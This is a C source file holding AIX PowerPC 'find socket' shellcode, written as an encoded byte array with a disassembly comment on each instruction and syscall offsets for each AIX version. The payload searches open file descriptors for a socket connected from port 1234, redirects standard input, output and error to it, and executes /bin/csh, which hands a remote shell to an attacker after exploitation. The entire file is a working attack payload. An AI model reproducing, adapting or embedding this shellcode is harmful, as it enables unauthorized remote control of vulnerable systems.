/*
 *  aix-power-fndsockcode.c
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Supported AIX versions:
 *
 * -DAIX614     AIX Version 6.1.4
 * -DAIX613     AIX Version 6.1.3
 * -DAIX612     AIX Version 6.1.2
 * -DAIX611     AIX Version 6.1.1
 * -DAIX5310    AIX Version 5.3.10
 * -DAIX539     AIX Version 5.3.9
 * -DAIX538     AIX Version 5.3.8
 * -DAIX537     AIX Version 5.3.7
 *
 */

#define FNDSOCKPORT 106

char fndsockcode[]=         /*  220 bytes                         */
    "\x7f\xff\xfa\x79"      /*  xor.    r31,r31,r31               */
    "\x40\x82\xff\xfd"      /*  bnel    <fndsockcode>             */
    "\x7f\xc8\x02\xa6"      /*  mflr    r30                       */
    "\x3b\xde\x01\xff"      /*  cal     r30,511(r30)              */
    "\x3b\xde\xfe\x1d"      /*  cal     r30,-483(r30)             */
    "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
    "\x4e\x80\x04\x20"      /*  bctr                              */
    "\x4c\xc6\x33\x42"      /*  crorc   6,6,6                     */
    "\x44\xff\xff\x02"      /*  svca    0                         */
    "\x3b\xde\xff\xf8"      /*  cal     r30,-8(r30)               */
    "\x3b\xa0\x07\xff"      /*  lil     r29,2047                  */
    "\x97\xe1\xff\xfc"      /*  stu     r31,-4(r1)                */
    "\x7c\x3c\x0b\x78"      /*  mr      r28,r1                    */
    "\x3b\x7d\xf8\x2d"      /*  cal     r27,-2003(r29)            */
    "\x97\x61\xff\xfc"      /*  stu     r27,-4(r1)                */
    "\x7c\x3b\x0b\x78"      /*  mr      r27,r1                    */
    "\x3b\xff\x01\xff"      /*  cal     r31,511(r31)              */
    "\x3b\xff\xfe\x02"      /*  cal     r31,-510(r31)             */
    "\x7f\x65\xdb\x78"      /*  mr      r5,r27                    */
    "\x7f\x84\xe3\x78"      /*  mr      r4,r28                    */
    "\x7f\xe3\xfb\x78"      /*  mr      r3,r31                    */
#ifdef AIX614
    "\x38\x5d\xf8\xd4"      /*  cal     r2,-1836(r29)             */
#endif
#ifdef AIX613
    "\x38\x5d\xf8\xce"      /*  cal     r2,-1842(r29)             */
#endif
#ifdef AIX612
    "\x38\x5d\xf8\xce"      /*  cal     r2,-1842(r29)             */
#endif
#ifdef AIX611
    "\x38\x5d\xf8\xcb"      /*  cal     r2,-1845(r29)             */
#endif
#ifdef AIX610
    "\x38\x5d\xf8\xcc"      /*  cal     r2,-1844(r29)             */
#endif
#ifdef AIX5310
    "\x38\x5d\xf8\xc7"      /*  cal     r2,-1849(r29)             */
#endif
#ifdef AIX539
    "\x38\x5d\xf8\xc7"      /*  cal     r2,-1849(r29)             */
#endif
#ifdef AIX538
    "\x38\x5d\xf8\xc7"      /*  cal     r2,-1849(r29)             */
#endif
#ifdef AIX537
    "\x38\x5d\xf8\xc7"      /*  cal     r2,-1849(r29)             */
#endif

    "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
    "\x4e\x80\x04\x21"      /*  bctrl                             */
    "\x3b\x5c\x01\xff"      /*  cal     r26,511(r28)              */
    "\xa3\x5a\xfe\x03"      /*  lhz     r26,-509(r26)             */
    "\x28\x1a\x04\xd2"      /*  cmpli   0,r26,1234                */
    "\x40\x82\xff\xd4"      /*  bne     <fndsockcode+64>          */
    "\x3b\x3d\xf8\x03"      /*  cal     r25,-2045(r29)            */
    "\x7f\x23\xcb\x78"      /*  mr      r3,r25                    */
#ifdef AIX614
    "\x38\x5d\xf9\x17"      /*  cal     r2,-1769(r29)             */
#endif
#ifdef AIX613
    "\x38\x5d\xf9\x11"      /*  cal     r2,-1775(r29)             */
#endif
#ifdef AIX612
    "\x38\x5d\xf9\x11"      /*  cal     r2,-1775(r29)             */
#endif
#ifdef AIX611
    "\x38\x5d\xf9\x0e"      /*  cal     r2,-1778(r29)             */
#endif
#ifdef AIX610
    "\x38\x5d\xf9\x0e"      /*  cal     r2,-1778(r29)             */
#endif
#ifdef AIX5310
    "\x38\x5d\xf8\xf6"      /*  cal     r2,-1802(r29)             */
#endif
#ifdef AIX539
    "\x38\x5d\xf8\xf6"      /*  cal     r2,-1802(r29)             */
#endif
#ifdef AIX538
    "\x38\x5d\xf8\xf6"      /*  cal     r2,-1802(r29)             */
#endif
#ifdef AIX537
    "\x38\x5d\xf8\xf6"      /*  cal     r2,-1802(r29)             */
#endif

    "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
    "\x4e\x80\x04\x21"      /*  bctrl                             */
    "\x7f\x25\xcb\x78"      /*  mr      r5,r25                    */
    "\x7c\x84\x22\x78"      /*  xor     r4,r4,r4                  */
    "\x7f\xe3\xfb\x78"      /*  mr      r3,r31                    */
#ifdef AIX614
    "\x38\x5d\xfa\x93"      /*  cal     r2,-1389(r29)             */
#endif
#ifdef AIX613
    "\x38\x5d\xfa\x85"      /*  cal     r2,-1403(r29)             */
#endif
#ifdef AIX612
    "\x38\x5d\xfa\x7c"      /*  cal     r2,-1412(r29)             */
#endif
#ifdef AIX611
    "\x38\x5d\xfa\x67"      /*  cal     r2,-1433(r29)             */
#endif
#ifdef AIX610
    "\x38\x5d\xfa\x6a"      /*  cal     r2,-1430(r29)             */
#endif
#ifdef AIX5310
    "\x38\x5d\xf9\xee"      /*  cal     r2,-1554(r29)             */
#endif
#ifdef AIX539
    "\x38\x5d\xf9\xee"      /*  cal     r2,-1554(r29)             */
#endif
#ifdef AIX538
    "\x38\x5d\xf9\xee"      /*  cal     r2,-1554(r29)             */
#endif
#ifdef AIX537
    "\x38\x5d\xf9\xee"      /*  cal     r2,-1554(r29)             */
#endif

    "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
    "\x4e\x80\x04\x21"      /*  bctrl                             */
    "\x37\x39\xff\xff"      /*  ai.     r25,r25,-1                */
    "\x40\x80\xff\xd4"      /*  bge     <fndsockcode+116>         */
    "\x7c\xa5\x2a\x79"      /*  xor.    r5,r5,r5                  */
    "\x40\x82\xff\xfd"      /*  bnel    <fndsockcode+164>         */
    "\x7f\x08\x02\xa6"      /*  mflr    r24                       */
    "\x3b\x18\x01\xff"      /*  cal     r24,511(r24)              */
    "\x38\x78\xfe\x29"      /*  cal     r3,-471(r24)              */
    "\x98\xb8\xfe\x31"      /*  stb     r5,-463(r24)              */
    "\x94\xa1\xff\xfc"      /*  stu     r5,-4(r1)                 */
    "\x94\x61\xff\xfc"      /*  stu     r3,-4(r1)                 */
    "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
#ifdef AIX614
    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
#endif
#ifdef AIX613
    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
#endif
#ifdef AIX612
    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
#endif
#ifdef AIX611
    "\x38\x5d\xf8\x08"      /*  cal     r2,-2040(r29)             */
#endif
#ifdef AIX610
    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
#endif
#ifdef AIX5310
    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
#endif
#ifdef AIX539
    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
#endif
#ifdef AIX538
    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
#endif
#ifdef AIX537
    "\x38\x5d\xf8\x07"      /*  cal     r2,-2041(r29)             */
#endif

    "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
    "\x4e\x80\x04\x21"      /*  bctrl                             */
    "/bin/csh"
;

